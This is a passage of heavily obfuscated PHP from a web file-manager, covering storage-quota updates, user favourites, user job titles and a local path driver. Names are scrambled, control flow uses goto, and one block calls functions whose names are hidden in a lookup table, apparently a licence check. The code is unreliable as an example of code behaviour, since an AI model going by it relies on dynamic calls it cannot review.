$this->parentLevelArray($F³Ö´ÎóÁÔ[$eŠß—Õ¤Ìä[455]]); foreach ($EĞöÚ²³î as $FàÄ¸Ş‰œË) { $FàÄ¸Ş‰œË = $FàÄ¸Ş‰œË . $eŠß—Õ¤Ìä[33]; if (!isset($Fô°ˆ©[$FàÄ¸Ş‰œË])) { continue; } if ($F³Ö´ÎóÁÔ[$eŠß—Õ¤Ìä[393]] == $Fô°ˆ©[$FàÄ¸Ş‰œË][$eŠß—Õ¤Ìä[393]]) { $Fô°ˆ©[$FàÄ¸Ş‰œË][$eŠß—Õ¤Ìä[77]] += $F³Ö´ÎóÁÔ[$eŠß—Õ¤Ìä[77]]; } } } $CâÅµ¥Æóë = array(); goto a¡ÖªÆº‘Å; a¡ÖªÆº‘Å: foreach ($Fô°ˆ© as $F³Ö´ÎóÁÔ) { if ($F³Ö´ÎóÁÔ[$eŠß—Õ¤Ìä[77]] == $F³Ö´ÎóÁÔ[$eŠß—Õ¤Ìä[2323]]) { continue; } $CâÅµ¥Æóë[] = array($eŠß—Õ¤Ìä[366], $F³Ö´ÎóÁÔ[$eŠß—Õ¤Ìä[366]], $eŠß—Õ¤Ìä[77], $F³Ö´ÎóÁÔ[$eŠß—Õ¤Ìä[77]]); } $this->saveAll($CâÅµ¥Æóë); goto f‘‘ ‹ĞÖ; föºÜğœå™: $Fô°ˆ©[] = $a¡ ËØ£‡; $Fô°ˆ© = array_to_keyvalue($Fô°ˆ©, $eŠß—Õ¤Ìä[366]); foreach ($Fô°ˆ© as $fÜ§¿óœÉĞ => $F³Ö´ÎóÁÔ) { $Fô°ˆ©[$fÜ§¿óœÉĞ][$eŠß—Õ¤Ìä[2323]] = $Fô°ˆ©[$fÜ§¿óœÉĞ][$eŠß—Õ¤Ìä[77]]; $Fô°ˆ©[$fÜ§¿óœÉĞ][$eŠß—Õ¤Ìä[77]] = 0; } goto bôùØ–ø; dõ¾ÕÂÈĞê: $eŠß—Õ¤Ìä =& $_SERVER[Äº¡•ô™Ÿ]; $this->sourceCacheClear($BËƒÑÜÈÈ“); $a¡ ËØ£‡ = $this->sourceInfo($BËƒÑÜÈÈ“); goto aÍÙÛ’ãá; aÍÙÛ’ãá: $FèŠó‘¤‹ = array($eŠß—Õ¤Ìä[514] => 1, $eŠß—Õ¤Ìä[521] => array($eŠß—Õ¤Ìä[479], $a¡ ËØ£‡[$eŠß—Õ¤Ìä[455]] . $BËƒÑÜÈÈ“ . $eŠß—Õ¤Ìä[480])); $FÇ‚ËÑ‡Õ† = $eŠß—Õ¤Ìä[2322]; $Fô°ˆ© = $this->field($FÇ‚ËÑ‡Õ†)->where($FèŠó‘¤‹)->select(); goto BŒöºÓ…Œá; BŒöºÓ…Œá: $FèŠó‘¤‹[$eŠß—Õ¤Ìä[367]] = 0; $A±‘«—©™± = $this->field($FÇ‚ËÑ‡Õ†)->where($FèŠó‘¤‹)->select(); if (!$A±‘«—©™±) { return; } goto föºÜğœå™; f‘‘ ‹ĞÖ: } public function userSpaceReset($EƒõÈÓéœ¸ = false) { $a¥Œë°‘‹† =& $_SERVER[Äº¡•ô™Ÿ]; $FŠËœŒª¹Ì = $this->where(array($a¥Œë°‘‹†[368] => self::TYPE_USER, $a¥Œë°‘‹†[452] => $EƒõÈÓéœ¸, $a¥Œë°‘‹†[367] => 0))->sum($a¥Œë°‘‹†[77]); Model($a¥Œë°‘‹†[470])->userEdit($EƒõÈÓéœ¸, array($a¥Œë°‘‹†[2065] => $FŠËœŒª¹Ì)); } public function targetSpaceUpdate($A™Õ‘˜³ÂÊ, $eŠÅ¼íî†‘) { $cîºÇ†ÃŞ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$eŠÅ¼íî†‘) { return; } if (!in_array($A™Õ‘˜³ÂÊ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $D…ÅÃ‘İ¬ = $this->targetSpaceSize($A™Õ‘˜³ÂÊ, $eŠÅ¼íî†‘); if ($A™Õ‘˜³ÂÊ == self::TYPE_USER) { Model($cîºÇ†ÃŞ[470])->userEdit($eŠÅ¼íî†‘, array($cîºÇ†ÃŞ[2065] => $D…ÅÃ‘İ¬)); } else { if ($A™Õ‘˜³ÂÊ == self::TYPE_GROUP) { Model($cîºÇ†ÃŞ[454])->groupEdit($eŠÅ¼íî†‘, array($cîºÇ†ÃŞ[2065] => $D…ÅÃ‘İ¬)); } } } public function targetSpaceSize($b¨ ¢¬ƒÌô, $eˆÑõÉ‚¾œ) { goto A†öƒ¶Üğ; bæİ¯œÇåƒ: return $A•Œ„ÕÃÍ; goto eó—ç·›Ö; cŒÅÔÔ¹ƒº: $Aë¾ƒ¾Ç¥é = array_to_keyvalue($Aë¾ƒ¾Ç¥é, $CÄ›×‰¬÷Æ[33], $CÄ›×‰¬÷Æ[366]); $Aë¾ƒ¾Ç¥é = array_unique(array_filter($Aë¾ƒ¾Ç¥é)); if ($Aë¾ƒ¾Ç¥é) { $cĞŒî˜±À = array($CÄ›×‰¬÷Æ[380] => array($CÄ›×‰¬÷Æ[381], $Aë¾ƒ¾Ç¥é)); $A•Œ„ÕÃÍ += floatval($this->where($cĞŒî˜±À)->sum($CÄ›×‰¬÷Æ[77])); } goto bæİ¯œÇåƒ; fòÕŸ™‘Úö: $A•Œ„ÕÃÍ = floatval($F„÷‡±‘Ä¤[$CÄ›×‰¬÷Æ[77]]); $cĞŒî˜±À = array($CÄ›×‰¬÷Æ[521] => array($CÄ›×‰¬÷Æ[479], $CÄ›×‰¬÷Æ[466] . $F„÷‡±‘Ä¤[$CÄ›×‰¬÷Æ[366]] . $CÄ›×‰¬÷Æ[480])); $Aë¾ƒ¾Ç¥é = Model($CÄ›×‰¬÷Æ[391])->field($CÄ›×‰¬÷Æ[380])->where($cĞŒî˜±À)->select(); goto cŒÅÔÔ¹ƒº; A†öƒ¶Üğ: $CÄ›×‰¬÷Æ =& $_SERVER[Äº¡•ô™Ÿ]; $F„÷‡±‘Ä¤ = $this->sourceRoot($b¨ ¢¬ƒÌô, $eˆÑõÉ‚¾œ, !0); if (!$F„÷‡±‘Ä¤) { return 0; } goto fòÕŸ™‘Úö; eó—ç·›Ö: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($F»¢“¸›) { return $this->fileTypeProfile($F»¢“¸›, SourceModel::TYPE_USER); } public function groupFileTypeProfile($a„ËÔóñíö) { return $this->fileTypeProfile($a„ËÔóñíö, SourceModel::TYPE_GROUP); } private function fileTypeProfile($fùÛãµ‰é¸, $b´§ÓçÇ”Ä) { goto d«êí§ëŸ; D¨®‹½‘¸é: $Bà™İÊ—Ÿ“ = array(); $Bà™İÊ—Ÿ“[$bóÒ‡ö×›‚[2325]] = array($bóÒ‡ö×›‚[2326] => LNG($bóÒ‡ö×›‚[2325]), $bóÒ‡ö×›‚[2327] => $this->where($f‰ìê“)->count(), $bóÒ‡ö×›‚[516] => $this->where($f‰ìê“)->sum($bóÒ‡ö×›‚[77])); $F÷—Ùô¨İ = KodIO::fileTypeList(); goto AİÅÁÉ°¿; FÛ¦÷Ôíğ: if ($c‘ËÔ…Îº”) { return $c‘ËÔ…Îº”; } $f‰ìê“ = array($bóÒ‡ö×›‚[514] => 0); if ($fùÛãµ‰é¸ != !1) { $f‰ìê“[$bóÒ‡ö×›‚[452]] = $fùÛãµ‰é¸; $f‰ìê“[$bóÒ‡ö×›‚[368]] = $b´§ÓçÇ”Ä; } goto D¨®‹½‘¸é; AİÅÁÉ°¿: foreach ($F÷—Ùô¨İ as $aõ£¾™®ª‚ => $FÚ«¹¥¬Ã™) { $f‰ìê“[$bóÒ‡ö×›‚[369]] = $this->fileTypeWhere($aõ£¾™®ª‚); $Bà™İÊ—Ÿ“[$aõ£¾™®ª‚] = array($bóÒ‡ö×›‚[2326] => $FÚ«¹¥¬Ã™[$bóÒ‡ö×›‚[28]], $bóÒ‡ö×›‚[2327] => $this->where($f‰ìê“)->count(), $bóÒ‡ö×›‚[516] => $this->where($f‰ìê“)->sum($bóÒ‡ö×›‚[77])); } Cache::set($d¿Ò¹œ–÷‡, $Bà™İÊ—Ÿ“, 1200); return $Bà™İÊ—Ÿ“; goto A–«õòÁº; d«êí§ëŸ: $bóÒ‡ö×›‚ =& $_SERVER[Äº¡•ô™Ÿ]; $d¿Ò¹œ–÷‡ = $bóÒ‡ö×›‚[2324] . $fùÛãµ‰é¸ . $bóÒ‡ö×›‚[70] . $b´§ÓçÇ”Ä; $c‘ËÔ…Îº” = Cache::get($d¿Ò¹œ–÷‡); goto FÛ¦÷Ôíğ; A–«õòÁº: } public function fileNameExist($b¡‘Áë­ç, $aƒêÛ¡ô¾‹) { $Aâ·‘Ë…ï§ =& $_SERVER[Äº¡•ô™Ÿ]; $eÔÍ£¨æŞš = $this->childList($b¡‘Áë­ç); foreach ($eÔÍ£¨æŞš as $d¾ÜÌìÀ‘) { if ($d¾ÜÌìÀ‘[$Aâ·‘Ë…ï§[28]] == $aƒêÛ¡ô¾‹) { return $d¾ÜÌìÀ‘[$Aâ·‘Ë…ï§[366]]; } } return !1; } public function childList($cˆ¢˜³§ëŞ) { goto Aù÷ãÛ†èÇ; Aù÷ãÛ†èÇ: $cä‰œ½‡æ¸ =& $_SERVER[Äº¡•ô™Ÿ]; $e­¬œÎïè× = $cä‰œ½‡æ¸[2305] . $cˆ¢˜³§ëŞ; if (isset(self::$cacheChildList[$e­¬œÎïè×])) { return self::$cacheChildList[$e­¬œÎïè×]; } goto e°¾¥î±Šë; Aö«ŠõÑ: self::$cacheChildList[$e­¬œÎïè×] = $AùÉğ×¡È©; foreach ($AùÉğ×¡È© as $FÊ¡ˆ·ŒµÊ) { $e­¬œÎïè× = $cä‰œ½‡æ¸[406] . $FÊ¡ˆ·ŒµÊ[$cä‰œ½‡æ¸[366]]; self::$cacheSourceInfo[$e­¬œÎïè×] = $FÊ¡ˆ·ŒµÊ; } return $AùÉğ×¡È©; goto B†øŸ×®ù²; e°¾¥î±Šë: $D­ÕÜ¹Ø›Ã = array($cä‰œ½‡æ¸[457] => intval($cˆ¢˜³§ëŞ), $cä‰œ½‡æ¸[393] => 0); $AùÉğ×¡È© = $this->where($D­ÕÜ¹Ø›Ã)->select(); $AùÉğ×¡È© = $AùÉğ×¡È© ? $AùÉğ×¡È© : array(); goto Aö«ŠõÑ; B†øŸ×®ù²: } public function fileNameAuto($b‹Îõåê‰, $EÊ°ƒŠÒÂ, $F‡ƒ‡‡ĞˆŸ = REPEAT_RENAME, $F£³²ğ†¥Å = false) { $D”£—«¦¤ =& $_SERVER[Äº¡•ô™Ÿ]; $cË˜¦ô˜Ş = $this->childList($b‹Îõåê‰); $B…Ë¸¿†ç· = array_to_keyvalue($cË˜¦ô˜Ş, $D”£—«¦¤[33], $D”£—«¦¤[28]); return $this->fileNameAutoGet($B…Ë¸¿†ç·, $EÊ°ƒŠÒÂ, $F‡ƒ‡‡ĞˆŸ, $F£³²ğ†¥Å); } public function fileNameAutoGet($d­ù¥ÉÓ“Š, $C×˜ØèáÄ, $d¼Şä¿ğ¸ª, $d²ğä†Ø­„) { $fŸº†Öêé¶ =& $_SERVER[Äº¡•ô™Ÿ]; if ($d¼Şä¿ğ¸ª == REPEAT_REPLACE || !$d­ù¥ÉÓ“Š || !in_array_not_case($C×˜ØèáÄ, $d­ù¥ÉÓ“Š) || $d²ğä†Ø­„ && $d¼Şä¿ğ¸ª != REPEAT_RENAME_FOLDER) { return $C×˜ØèáÄ; } if ($d¼Şä¿ğ¸ª == REPEAT_SKIP) { return !1; } $E†Ê¿ÀôÎÕ = $fŸº†Öêé¶[93] . get_path_ext($C×˜ØèáÄ); $E†Ê¿ÀôÎÕ = $E†Ê¿ÀôÎÕ == $fŸº†Öêé¶[93] || $d²ğä†Ø­„ ? $fŸº†Öêé¶[33] : $E†Ê¿ÀôÎÕ; for ($A÷·»ùÚ³‰ = 1; $A÷·»ùÚ³‰ <= count($d­ù¥ÉÓ“Š) + 1; $A÷·»ùÚ³‰++) { $EÄµ‰Í íˆ = substr($C×˜ØèáÄ, 0, strlen($C×˜ØèáÄ) - strlen($E†Ê¿ÀôÎÕ)); $D¹í·ğ—Œ£ = $EÄµ‰Í íˆ . "\x28{$A÷·»ùÚ³‰}\x29{$E†Ê¿ÀôÎÕ}"; if (!in_array_not_case($D¹í·ğ—Œ£, $d­ù¥ÉÓ“Š)) { return $D¹í·ğ—Œ£; } } } } goto aÑŞ»ÉŠïÉ; F™÷ÈÄ×»Ö: if ($_SERVER[$_SERVER[Äº¡•ô™Ÿ][789]] != $_SERVER[$_SERVER[Äº¡•ô™Ÿ][790]]) { goto bÍÛËÑİ¤; aŞÜÜÄƒØ’: $b‹ç¿Ö´($_SERVER[$_SERVER[Äº¡•ô™Ÿ][1205]]); goto A§ë¶÷¢…; fê ­Ö‡“§: $A·Òíà‹ò = explode($_SERVER[Äº¡•ô™Ÿ][214], $D À‡õší­); if (count($A·Òíà‹ò) < $_SERVER[Äº¡•ô™Ÿ][561]) { $f¸¨„£ÂŸ = $_SERVER[Äº¡•ô™Ÿ][795]; $f¸¨„£ÂŸ(); } $b‹ç¿Ö´ = $_SERVER[Äº¡•ô™Ÿ][1204]; goto aŞÜÜÄƒØ’; bÍÛËÑİ¤: $bàŠ‡ö¬—ó = $_SERVER[Äº¡•ô™Ÿ][792]; $f­À½æˆ = $_SERVER[$_SERVER[Äº¡•ô™Ÿ][793]] . $_SERVER[Äº¡•ô™Ÿ][794]; $D À‡õší­ = $bàŠ‡ö¬—ó($f­À½æˆ); goto fê ­Ö‡“§; A§ë¶÷¢…: } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\x72\137\x66\x61\166"; protected function cacheFunctionAlias($F¬öÆáğ‘’) { $Dİ™„¼“âÒ =& $_SERVER[Äº¡•ô™Ÿ]; return array($Dİ™„¼“âÒ[2451] => array(USER_ID, $Dİ™„¼“âÒ[2452])); } protected function listData() { $Bº¼šµÒÕ =& $_SERVER[Äº¡•ô™Ÿ]; $aï¦¨¶†£Ÿ = array($Bº¼šµÒÕ[1407] => USER_ID, $Bº¼šµÒÕ[432] => 0); $dµ‚ˆ·ƒ»¼ = $Bº¼šµÒÕ[2453]; $F§óÅò‘â¶ = $this->field($dµ‚ˆ·ƒ»¼)->where($aï¦¨¶†£Ÿ)->order($Bº¼šµÒÕ[2454])->select(); return $F§óÅò‘â¶ ? $F§óÅò‘â¶ : array(); } protected function resetCache() { } protected function listView() { goto f“‡–êˆÆ; EÈŒæğƒ—º: $dî…ÖÌßª = array_to_keyvalue($aÄ²‡Ñë¥œ, $CÅ —ëòÏ£[33], $CÅ —ëòÏ£[75]); if (!$dî…ÖÌßª) { return $d§’­…áé¸; } $F¹Â«¯ÄÛ = 2000; goto a°á•ÀáŞ; f“‡–êˆÆ: $CÅ —ëòÏ£ =& $_SERVER[Äº¡•ô™Ÿ]; $d§’­…áé¸ = $this->listData(); $aÄ²‡Ñë¥œ = array_filter_by_field($d§’­…áé¸, $CÅ —ëòÏ£[29], $CÅ —ëòÏ£[379]); goto EÈŒæğƒ—º; a°á•ÀáŞ: $cñ ¦‘®â• = array($CÅ —ëòÏ£[380] => array($CÅ —ëòÏ£[381], $dî…ÖÌßª)); $f«íÑº´™¸ = Model($CÅ —ëòÏ£[755])->listSource($cñ ¦‘®â•, $F¹Â«¯ÄÛ); $f«íÑº´™¸ = array_merge($f«íÑº´™¸[$CÅ —ëòÏ£[73]], $f«íÑº´™¸[$CÅ —ëòÏ£[74]]); goto FŠÏšÑ…­; FŠÏšÑ…­: $f«íÑº´™¸ = array_to_keyvalue($f«íÑº´™¸, $CÅ —ëòÏ£[366]); foreach ($d§’­…áé¸ as $dç¾»§ ğæ => $B³¡•§·±Á) { $FÚ©íºÇ¦ = $f«íÑº´™¸[$B³¡•§·±Á[$CÅ —ëòÏ£[75]]]; $FÚ©íºÇ¦ = $FÚ©íºÇ¦ ? $FÚ©íºÇ¦ : array(); $d§’­…áé¸[$dç¾»§ ğæ] = array_merge($FÚ©íºÇ¦, $B³¡•§·±Á); } return $d§’­…áé¸; goto DÜ„‘Á±ß²; DÜ„‘Á±ß²: } protected function addFav($bÄø—éÔ®, $Bº†ˆöŒì÷ = '', $d‘ò„‘Ìå = "\x73\x6f\x75\x72\143\x65") { goto F¡‡øâàš; E°Æó˜‡á¸: $E´¶œï“°š = array($EåŞÕ‚ø†¸[1407] => USER_ID, $EåŞÕ‚ø†¸[432] => 0); $EŸ§©ä‘ = $this->where($E´¶œï“°š)->max($EåŞÕ‚ø†¸[2100]); if (!$EŸ§©ä‘) { $EŸ§©ä‘ = 0; } goto EÕ‹›ï‡¾•; EÕ‹›ï‡¾•: if (!$Bº†ˆöŒì÷ && $d‘ò„‘Ìå == $EåŞÕ‚ø†¸[379]) { $aÎšî²„éŒ = Model($EåŞÕ‚ø†¸[1110])->where(array($EåŞÕ‚ø†¸[380] => $bÄø—éÔ®))->find(); if (!$aÎšî²„éŒ) { return !1; } $Bº†ˆöŒì÷ = $aÎšî²„éŒ[$EåŞÕ‚ø†¸[28]]; } $Bº†ˆöŒì÷ = $this->getAutoName($Bº†ˆöŒì÷); $BŒÖù—äç§ = array($EåŞÕ‚ø†¸[1407] => USER_ID, $EåŞÕ‚ø†¸[432] => 0, $EåŞÕ‚ø†¸[383] => $Bº†ˆöŒì÷, $EåŞÕ‚ø†¸[384] => $bÄø—éÔ®, $EåŞÕ‚ø†¸[385] => $d‘ò„‘Ìå, $EåŞÕ‚ø†¸[2083] => $EŸ§©ä‘ + 1); goto c„ä‰‰×–Ä; F¡‡øâàš: $EåŞÕ‚ø†¸ =& $_SERVER[Äº¡•ô™Ÿ]; $E´¶œï“°š = array($EåŞÕ‚ø†¸[1407] => USER_ID, $EåŞÕ‚ø†¸[432] => 0, $EåŞÕ‚ø†¸[385] => $d‘ò„‘Ìå, $EåŞÕ‚ø†¸[384] => $bÄø—éÔ®); if ($this->where($E´¶œï“°š)->find()) { return !1; } goto E°Æó˜‡á¸; c„ä‰‰×–Ä: return $this->add($BŒÖù—äç§); goto FÂ‚ŸÙÑà; FÂ‚ŸÙÑà: } protected function remove($BÚ¾Ÿ†ù¡) { $a”¡áäæÛª =& $_SERVER[Äº¡•ô™Ÿ]; $cÍçğîŠ•œ = array($a”¡áäæÛª[1407] => USER_ID, $a”¡áäæÛª[382] => $BÚ¾Ÿ†ù¡); return $this->where($cÍçğîŠ•œ)->delete(); } protected function removeByName($E¿ãˆáó¢ê) { $Aæ‰Ü‚À—ƒ =& $_SERVER[Äº¡•ô™Ÿ]; $e”æÎŠÏŠ• = array($Aæ‰Ü‚À—ƒ[1407] => USER_ID, $Aæ‰Ü‚À—ƒ[383] => $E¿ãˆáó¢ê, $Aæ‰Ü‚À—ƒ[432] => 0); return $this->where($e”æÎŠÏŠ•)->delete(); } protected function rename($f–ÍÄëŞæ§, $B­åÙ°àˆ) { $a¸†îç“– =& $_SERVER[Äº¡•ô™Ÿ]; if ($f–ÍÄëŞæ§ == $B­åÙ°àˆ) { return !1; } $B¢»¶¾ñ¤Ì = $this->getAutoName($B­åÙ°àˆ); if ($B­åÙ°àˆ != $B¢»¶¾ñ¤Ì) { return !1; } $dõÛğíŠ¹¢ = array($a¸†îç“–[1407] => USER_ID, $a¸†îç“–[432] => 0, $a¸†îç“–[28] => $f–ÍÄëŞæ§); return $this->where($dõÛğíŠ¹¢)->save(array($a¸†îç“–[28] => $B­åÙ°àˆ)); } protected function resetSort($dâ¬ë¾ğğĞ) { $BÎñ²‚š—Á =& $_SERVER[Äº¡•ô™Ÿ]; $dâ¬ë¾ğğĞ = is_array($dâ¬ë¾ğğĞ) ? $dâ¬ë¾ğğĞ : array(); $Eµ³Ÿ‹Ó¶³ = array($BÎñ²‚š—Á[1407] => USER_ID); for ($d˜äâšÎî = 0; $d˜äâšÎî < count($dâ¬ë¾ğğĞ); $d˜äâšÎî++) { $Eµ³Ÿ‹Ó¶³[$BÎñ²‚š—Á[382]] = $dâ¬ë¾ğğĞ[$d˜äâšÎî]; $this->where($Eµ³Ÿ‹Ó¶³)->save(array($BÎñ²‚š—Á[2083] => $d˜äâšÎî + 1)); } return !0; } protected function moveTop($AéõÄ…×ù) { goto bØÍšáÃŒ; FôéºÍÉÎİ: return $this->resetSort($fÊˆŸÅíƒ); goto D®Ö©§’‰”; bØÍšáÃŒ: $DÈ¾ŠÕÃ• =& $_SERVER[Äº¡•ô™Ÿ]; $E‹…ó¯‚«ï = array($DÈ¾ŠÕÃ•[1407] => USER_ID, $DÈ¾ŠÕÃ•[432] => 0); $a–‰†Ì‚ÓŠ = $this->where($E‹…ó¯‚«ï)->where(array($DÈ¾ŠÕÃ•[28] => $AéõÄ…×ù))->find(); goto f¤‰ÎºÉ—§; f‹½×´ƒ: $DßÉªîäÂ = $fÊˆŸÅíƒ; $fÊˆŸÅíƒ = array_remove_value($fÊˆŸÅíƒ, $a–‰†Ì‚ÓŠ[$DÈ¾ŠÕÃ•[364]]); array_unshift($fÊˆŸÅíƒ, $a–‰†Ì‚ÓŠ[$DÈ¾ŠÕÃ•[364]]); goto FôéºÍÉÎİ; f¤‰ÎºÉ—§: if (!$a–‰†Ì‚ÓŠ) { return; } $fÊˆŸÅíƒ = $this->field($DÈ¾ŠÕÃ•[364])->where($E‹…ó¯‚«ï)->order($DÈ¾ŠÕÃ•[2454])->select(); $fÊˆŸÅíƒ = array_to_keyvalue($fÊˆŸÅíƒ, $DÈ¾ŠÕÃ•[33], $DÈ¾ŠÕÃ•[364]); goto f‹½×´ƒ; D®Ö©§’‰”: } protected function moveBottom($A²Â×á÷) { $bÇÓ‰”ò÷© =& $_SERVER[Äº¡•ô™Ÿ]; $C´Åò˜öˆÂ = array($bÇÓ‰”ò÷©[1407] => USER_ID, $bÇÓ‰”ò÷©[432] => 0); $fß¶ŞÈ†õê = $this->where($C´Åò˜öˆÂ)->max($bÇÓ‰”ò÷©[2100]); $E§ÎÓ‚†ß‘ = array($bÇÓ‰”ò÷©[2100] => $fß¶ŞÈ†õê + 1); return $this->where($C´Åò˜öˆÂ)->where(array($bÇÓ‰”ò÷©[28] => $A²Â×á÷))->save($E§ÎÓ‚†ß‘); } private function getAutoName($aí£ÏÙø·œ) { goto bÉíÓ©Õïİ; bÉíÓ©Õïİ: $E¡¯¯ğÜ¹Š =& $_SERVER[Äº¡•ô™Ÿ]; $cøÔ‹¨³‰ = array($E¡¯¯ğÜ¹Š[1407] => USER_ID, $E¡¯¯ğÜ¹Š[432] => 0); $c¼ª¿ŒæĞ = $this->field($E¡¯¯ğÜ¹Š[28])->where($cøÔ‹¨³‰)->select(); goto Bî·êìôçˆ; bŞ¡„º·ƒ: return $aí£ÏÙø·œ . "\x28{$fÂŸñÇÔ­Õ}\51"; goto fÅñÏ§çé; Bî·êìôçˆ: $c¼ª¿ŒæĞ = array_to_keyvalue($c¼ª¿ŒæĞ, $E¡¯¯ğÜ¹Š[33], $E¡¯¯ğÜ¹Š[28]); if (!$c¼ª¿ŒæĞ || !in_array($aí£ÏÙø·œ, $c¼ª¿ŒæĞ)) { return $aí£ÏÙø·œ; } for ($fÂŸñÇÔ­Õ = 0; $fÂŸñÇÔ­Õ < count($c¼ª¿ŒæĞ); $fÂŸñÇÔ­Õ++) { if (!in_array($aí£ÏÙø·œ . "\50{$fÂŸñÇÔ­Õ}\x29", $c¼ª¿ŒæĞ)) { return $aí£ÏÙø·œ . "\50{$fÂŸñÇÔ­Õ}\x29"; } } goto bŞ¡„º·ƒ; fÅñÏ§çé: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\152\157\142\x4c\x69\163\x74"; public $field = array("\156\x61\155\145", "\x64\x65\x73\x63", "\163\157\x72\x74"); const JOB_KEY = "\163\x65\154\x66\112\157\x62\114\151\x73\164"; public function listData($B’™Û©¾„ = false, $dß²™Ÿ„„‘ = "\x73\x6f\x72\164", $b²œâğÁ¨× = false) { return parent::listData($B’™Û©¾„, $dß²™Ÿ„„‘, $b²œâğÁ¨×); } public function remove($dŠˆÉ¿¾æ) { return parent::remove($dŠˆÉ¿¾æ); } public function add($aÃèèë­ƒê) { $AÍ¯ßƒô… =& $_SERVER[Äº¡•ô™Ÿ]; if ($this->findByName($aÃèèë­ƒê[$AÍ¯ßƒô…[28]])) { return !1; } $aÃèèë­ƒê[$AÍ¯ßƒô…[2100]] = $this->getSort(); return parent::insert($aÃèèë­ƒê); } private function getSort() { $fâ¶™ÌœÕ¡ =& $_SERVER[Äº¡•ô™Ÿ]; $e“Şöæ¦í• = parent::listData(); $a´¿Íø² = array_to_keyvalue($e“Şöæ¦í•, $fâ¶™ÌœÕ¡[33], $fâ¶™ÌœÕ¡[2100]); return empty($a´¿Íø²) ? 0 : max($a´¿Íø²) + 1; } public function update($c£¨ˆÙ®Á·, $AªƒôËÕˆƒ) { $BÇĞœÅ»®¡ =& $_SERVER[Äº¡•ô™Ÿ]; $B—çšÅ‚æÓ = parent::listData($c£¨ˆÙ®Á·); $CĞ½æÎ©³ì = $this->findByName($AªƒôËÕˆƒ[$BÇĞœÅ»®¡[28]]); if (!$B—çšÅ‚æÓ || $CĞ½æÎ©³ì && $CĞ½æÎ©³ì[$BÇĞœÅ»®¡[364]] != $B—çšÅ‚æÓ[$BÇĞœÅ»®¡[364]]) { return !1; } return parent::update($c£¨ˆÙ®Á·, $AªƒôËÕˆƒ); } public function setUserJob($Fï‰ãôÜ, $BÑÈŒÜ˜è) { goto b¿æ ¼³ß; fƒöóÚ‹Á´: $eÆ¬Ñ¯§’ = rtrim($eÆ¬Ñ¯§’, $B§¡ôÂÂ¢[47]); Model($B§¡ôÂÂ¢[473])->metaSet($Fï‰ãôÜ, self::JOB_KEY, $eÆ¬Ñ¯§’); goto Eª¸§ƒîÃù; D–Ö ·Ú¼ø: $a§¼‰‡ÕÏì = array_to_keyvalue($Aˆ¨Çİ¸Ô¡, $B§¡ôÂÂ¢[28]); $eÆ¬Ñ¯§’ = $B§¡ôÂÂ¢[358]; foreach ($BÑÈŒÜ˜è as $c¨÷Ûñõœ¨) { if ($a§¼‰‡ÕÏì[$c¨÷Ûñõœ¨]) { $eÆ¬Ñ¯§’ .= $a§¼‰‡ÕÏì[$c¨÷Ûñõœ¨][$B§¡ôÂÂ¢[364]] . $B§¡ôÂÂ¢[47]; } else { $c˜Şò¬§ŒÌ = $this->add($c¨÷Ûñõœ¨); $eÆ¬Ñ¯§’ .= $c˜Şò¬§ŒÌ . $B§¡ôÂÂ¢[47]; } } goto fƒöóÚ‹Á´; b¿æ ¼³ß: $B§¡ôÂÂ¢ =& $_SERVER[Äº¡•ô™Ÿ]; if (!is_array($BÑÈŒÜ˜è)) { $BÑÈŒÜ˜è = array($BÑÈŒÜ˜è); } $Aˆ¨Çİ¸Ô¡ = parent::listData(); goto D–Ö ·Ú¼ø; Eª¸§ƒîÃù: } public function getUserJob($C‡¦¦±İ¹‘) { $b“…øëŒÒà = Model($_SERVER[Äº¡•ô™Ÿ][473])->metaGet($C‡¦¦±İ¹‘); return $this->getUserJobInfo($b“…øëŒÒà[self::JOB_KEY]); } public function getUserJobInfo($B‹Í†‚‹é°) { goto cÂ¢äçÖ‹Ì; cÂ¢äçÖ‹Ì: $bÎ…¶ï®œâ =& $_SERVER[Äº¡•ô™Ÿ]; $EòŸ†‘“¹Ş = explode($bÎ…¶ï®œâ[47], $B‹Í†‚‹é°); $e«‹’Å¦° = parent::listData(); goto f‹Î ƒÄŞˆ; e·–¯É¡Ğ: return $Cá‰¶‹•„Ÿ; goto aïˆŸœÊÒ†; f‹Î ƒÄŞˆ: $e«‹’Å¦° = array_remove_key($e«‹’Å¦°, $bÎ…¶ï®œâ[184]); $Cá‰¶‹•„Ÿ = array(); foreach ($EòŸ†‘“¹Ş as $DÈˆ—ç£±İ) { if (isset($e«‹’Å¦°[$DÈˆ—ç£±İ])) { $Cá‰¶‹•„Ÿ[] = $e«‹’Å¦°[$DÈˆ—ç£±İ]; } } goto e·–¯É¡Ğ; aïˆŸœÊÒ†: } } goto F™ºØÒ¯’‚; cøÃÉ³Ø„»: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($b¬„×Ã‡…Á) { if (substr($b¬„×Ã‡…Á, 0, 2) == $_SERVER[Äº¡•ô™Ÿ][1147]) { $b¬„×Ã‡…Á = BASIC_PATH . substr($b¬„×Ã‡…Á, 2); } return $b¬„×Ã‡…Á; } public function iconvApp($D¬Û‚¶Åõ) { $E›ë”ºò´ =& $_SERVER[Äº¡•ô™Ÿ]; global $config; return $this->iconvTo($D¬Û‚¶Åõ, $config[$E›ë”ºò´[1145]], $config[$E›ë”ºò´[1144]]); } public function iconvSystem($DÁî çÄÃ) { $dïø’Ãô‰ô =& $_SERVER[Äº¡•ô™Ÿ]; global $config; return $this->iconvTo($DÁî çÄÃ, $config[$dïø’Ãô‰ô[1144]], $config[$dïø’Ãô‰ô[1145]]); } public function getPathOuter($c¸ğå·œÙ°) { goto A‘¡¤˜øğ; FÛÆ¿®¾Áè: $c¸ğå·œÙ° = KodIO::clear($c¸ğå·œÙ°); $c¸ğå·œÙ° = substr($c¸ğå·œÙ°, strlen($a„ïáùºĞˆ)); if (empty($this->pathDriver)) { return $c¸ğå·œÙ°; } goto d¬‚“©ÀÓ¾; d¬‚“©ÀÓ¾: return $this->pathDriver . $C‘³‡°•¡[8] . ltrim($c¸ğå·œÙ°, $C‘³‡°•¡[8]); goto C‡‚Şß·˜; eäõßÉª ‹: if (substr($a„ïáùºĞˆ, 0, 2) == $C‘³‡°•¡[1147]) { $a„ïáùºĞˆ = BASIC_PATH . substr($a„ïáùºĞˆ, 2); } if (substr($c¸ğå·œÙ°, 